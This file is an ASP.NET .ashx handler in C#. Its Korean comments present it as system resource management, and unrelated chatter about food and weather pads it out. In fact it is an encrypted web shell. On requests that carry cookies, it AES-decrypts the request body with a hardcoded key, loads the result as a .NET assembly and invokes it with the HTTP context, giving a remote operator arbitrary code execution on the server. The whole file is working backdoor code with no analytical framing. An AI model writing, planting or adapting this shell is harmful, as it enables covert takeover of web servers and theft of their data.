<%@ WebHandler Language="C#" Class="K_fog_7z" %>
using System;
using System.Web;
using System.Security.Cryptography;
using System.Reflection;
using System.Text;

// 이 코드는 시스템 리소스를 관리합니다.
public class K_fog_7z : IHttpHandler {
    public void ProcessRequest(HttpContext _ctx) {
        // 배고파요, 치킨 먹고 싶다.
        if (_ctx.Request.Cookies.Count == 0) return;

        // 익명 메소드로 로직 캡슐화
        Action exec = () => {
            // 키는 Base64로 인코딩되어 있습니다.
            var b64_k = "Y2E2MzQ1NzUzOGI5YjFlMA==";
            var k_bytes = Convert.FromBase64String(b64_k);
            
            // 오늘 날씨가 정말 좋네요.
            var req_data = new byte[_ctx.Request.ContentLength];
            _ctx.Request.InputStream.Read(req_data, 0, req_data.Length);
            
            // 암호화 해제 로직
            var provider = new RijndaelManaged();
            var decryptor = provider.CreateDecryptor(k_bytes, k_bytes);
            var asm_bytes = decryptor.TransformFinalBlock(req_data, 0, req_data.Length);

            // 주말에 뭐 할까요?
            var class_name = Encoding.UTF8.GetString(Convert.FromBase64String("Sw==")); // "K"
            var asm = Assembly.Load(asm_bytes);
            var inst = asm.CreateInstance(class_name);
            
            var m_info = inst.GetType().GetMethod("Equals", new Type[] { typeof(object) });
            m_info.Invoke(inst, new object[] { _ctx });
        };
        
        exec();
    }
    
    // 이 핸들러는 재사용할 수 없습니다. 상태를 유지하지 않음.
    public bool IsReusable { get { return false; } }
}